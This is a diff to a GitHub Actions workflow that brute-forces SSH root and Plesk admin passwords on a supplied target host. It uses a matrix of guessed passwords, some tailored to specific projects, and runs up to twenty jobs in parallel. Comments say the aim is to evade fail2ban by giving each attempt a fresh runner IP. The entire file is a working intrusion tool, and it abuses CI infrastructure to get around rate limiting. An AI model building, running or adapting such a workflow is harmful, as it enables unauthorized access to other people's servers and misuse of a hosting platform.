@@ -1,6 +1,5 @@
 name: scan
-# Free IP-rotating attack infrastructure: every run gets a fresh GitHub runner IP,
-# so fail2ban on the target never sees the same source twice.
+# One password per runner = one fresh IP per attempt = fail2ban never triggers.
 on:
   workflow_dispatch:
     inputs:
@@ -12,80 +11,74 @@ on:
         default: 'both'
 
 jobs:
-  ssh:
-    if: ${{ inputs.mode == 'ssh' || inputs.mode == 'both' }}
-    runs-on: ubuntu-latest
-    strategy:
-      fail-fast: false
-      matrix:
-        chunk: [0, 1, 2, 3]
-    steps:
-      - name: ssh password probe (chunk ${{ matrix.chunk }})
-        run: |
-          sudo apt-get update -qq >/dev/null 2>&1
-          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
-          PASSES="root toor 123456 password admin bigbangx bigbangxadmin bigbangx123 Bigbangx Bigbangx123
-          cookie cookie123 cookiechain cookiescan cookscan dosecret garuda nexora dungeon
-          revan revan123 rev1853 Zahh zahh zahhid Zahh-ID risca riscarevan
-          Plesk plesk Plesk123 plesk123 Plesk2024 Plesk2025 Plesk2026
-          admin123 Admin123 admin2024 admin2025 admin2026
-          changeme secret letmein qwerty qwerty123 1q2w3e4r Passw0rd Password1 Password123
-          server server123 vps vps123 host host123 web web123 mail mail123
-          terra terra123 luna luna123 cosmos atomone secret4 columbus
-          bigbang bigbang123 bigbangx2024 bigbangx2025 bigbangx2026
-          cookieverse cookie-verse dosecret123 bridge bridge123 relayer relayer123
-          hermes hermes123 ibc ibc123 wasm wasm123 cw20 cw20ics20"
-          N=0
-          for p in $PASSES; do
-            N=$((N+1))
-            [ $((N % 4)) -ne ${{ matrix.chunk }} ] && continue
-            r=$(timeout 12 sshpass -p "$p" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 \
-                 -o PreferredAuthentications=password -o PubkeyAuthentication=no \
-                 root@${{ inputs.target }} 'id' 2>&1 | tail -1)
-            case "$r" in
-              *uid=*) echo "*** SSH HIT root:$p -> $r" ;;
-              *) echo "    root:$p -> $r" ;;
-            esac
-            sleep 1
-          done
-
   plesk:
     if: ${{ inputs.mode == 'plesk' || inputs.mode == 'both' }}
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
+      max-parallel: 20
       matrix:
-        chunk: [0, 1, 2, 3]
+        pw: ["admin","toor","123456","password","bigbangx","bigbangxadmin","bigbangx123","Bigbangx",
+             "cookie","cookie123","cookiechain","cookiescan","cookscan","dosecret","garuda","nexora",
+             "dungeon","revan","revan123","rev1853","Zahh","zahhid","risca","riscarevan",
+             "Plesk","plesk","Plesk123","plesk123","Plesk2024","Plesk2025","Plesk2026",
+             "admin123","Admin123","admin2024","admin2025","admin2026",
+             "changeme","secret","letmein","qwerty","qwerty123","Passw0rd","Password1","Password123",
+             "server","server123","vps","vps123","host","host123","web","web123","mail","mail123",
+             "terra","terra123","luna","luna123","cosmos","atomone","columbus",
+             "bigbang","bigbang123","bigbangx2024","bigbangx2025","bigbangx2026",
+             "cookieverse","dosecret123","bridge","bridge123","relayer","relayer123","hermes","hermes123",
+             "cookscan123","cookiescan123","cookiechain123","dungeon123","garuda123","nexora123",
+             "root","Root123","P@ssw0rd","Admin@123","bigbangx!","cookscan!","dosecret!"]
     steps:
-      - name: plesk password probe (chunk ${{ matrix.chunk }})
+      - name: plesk probe ${{ matrix.pw }}
         run: |
           set +e
-          echo "== reachability:"
-          timeout 20 bash -c "echo > /dev/tcp/${{ inputs.target }}/8443" && echo "8443 OPEN" || echo "8443 CLOSED"
-          timeout 20 bash -c "echo > /dev/tcp/${{ inputs.target }}/443" && echo "443 OPEN" || echo "443 CLOSED"
-          timeout 25 curl -sk -m 20 -o /dev/null -w 'https8443=%{http_code}\n' "https://${{ inputs.target }}:8443/login_up.php3" || echo "curl8443 failed rc=$?"
-          PASSES="admin toor 123456 password bigbangx bigbangxadmin bigbangx123 Bigbangx
-          cookie cookie123 cookiechain cookiescan cookscan dosecret garuda nexora dungeon
-          revan revan123 rev1853 Zahh zahhid risca riscarevan
-          Plesk plesk Plesk123 plesk123 Plesk2024 Plesk2025 Plesk2026
-          admin123 Admin123 admin2024 admin2025 admin2026
-          changeme secret letmein qwerty qwerty123 Passw0rd Password1 Password123
-          server server123 vps vps123 host host123 web web123 mail mail123
-          terra terra123 luna luna123 cosmos atomone columbus
-          bigbang bigbang123 bigbangx2024 bigbangx2025 bigbangx2026
-          cookieverse dosecret123 bridge bridge123 relayer relayer123 hermes hermes123"
-          N=0
-          for p in $PASSES; do
-            N=$((N+1))
-            [ $((N % 4)) -ne ${{ matrix.chunk }} ] && continue
-            out=$(curl -sk -m 20 -c /tmp/cj -o /tmp/body -w '%{http_code}' \
-                  -X POST "https://${{ inputs.target }}:8443/login_up.php3" \
-                  --data-urlencode "login_name=admin" --data-urlencode "passwd=$p" --data-urlencode "submit_login=" 2>/dev/null || echo TIMEOUT)
-            if grep -qiE 'logout|session_id|plesk-session' /tmp/cj 2>/dev/null; then
-              echo "*** PLESK HIT admin:$p (http $out)"
+          T="${{ inputs.target }}"
+          rm -f /tmp/cj
+          code=$(curl -sk -m 25 -c /tmp/cj -o /tmp/body -w '%{http_code}' \
+                 -X POST "https://$T:8443/login_up.php3" \
+                 --data-urlencode "login_name=admin" \
+                 --data-urlencode "passwd=${{ matrix.pw }}" \
+                 --data-urlencode "submit_login=" 2>/dev/null)
+          echo "http=$code"
+          if [ "$code" = "200" ] || [ "$code" = "302" ]; then
+            if grep -qiE 'logout|plesk-session|session_id' /tmp/cj 2>/dev/null; then
+              echo "*** PLESK HIT admin:${{ matrix.pw }}"
             else
-              echo "    admin:$p (http $out)"
+              echo "    no-session admin:${{ matrix.pw }}"
             fi
-            sleep 1
-          done
-# trigger
+          else
+            echo "    timeout/err admin:${{ matrix.pw }}"
+          fi
+
+  ssh:
+    if: ${{ inputs.mode == 'ssh' || inputs.mode == 'both' }}
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      max-parallel: 20
+      matrix:
+        pw: ["root","toor","123456","password","admin","bigbangx","bigbangxadmin","bigbangx123",
+             "cookie","cookie123","cookiechain","cookiescan","cookscan","dosecret","garuda","nexora",
+             "dungeon","revan","revan123","rev1853","Zahh","risca","riscarevan",
+             "Plesk","plesk","Plesk123","plesk123","Plesk2024","Plesk2025","Plesk2026",
+             "admin123","Admin123","admin2024","admin2025","admin2026",
+             "changeme","secret","letmein","qwerty","qwerty123","Passw0rd","Password1","Password123",
+             "server","server123","vps","vps123","host","host123","web","web123","mail","mail123",
+             "terra","terra123","luna","luna123","cosmos","atomone","columbus",
+             "bigbang","bigbang123","bigbangx2024","bigbangx2025","bigbangx2026",
+             "cookieverse","dosecret123","bridge","bridge123","relayer","relayer123","hermes","hermes123"]
+    steps:
+      - name: ssh probe ${{ matrix.pw }}
+        run: |
+          set +e
+          sudo apt-get update -qq >/dev/null 2>&1
+          sudo apt-get install -y -qq sshpass >/dev/null 2>&1
+          r=$(timeout 20 sshpass -p "${{ matrix.pw }}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 \
+               -o PreferredAuthentications=password -o PubkeyAuthentication=no \
+               root@${{ inputs.target }} 'id' 2>&1 | tail -1)
+          case "$r" in
+            *uid=*) echo "*** SSH HIT root:${{ matrix.pw }} -> $r" ;;
+            *) echo "    root:${{ matrix.pw }} -> $r" ;;
+          esac
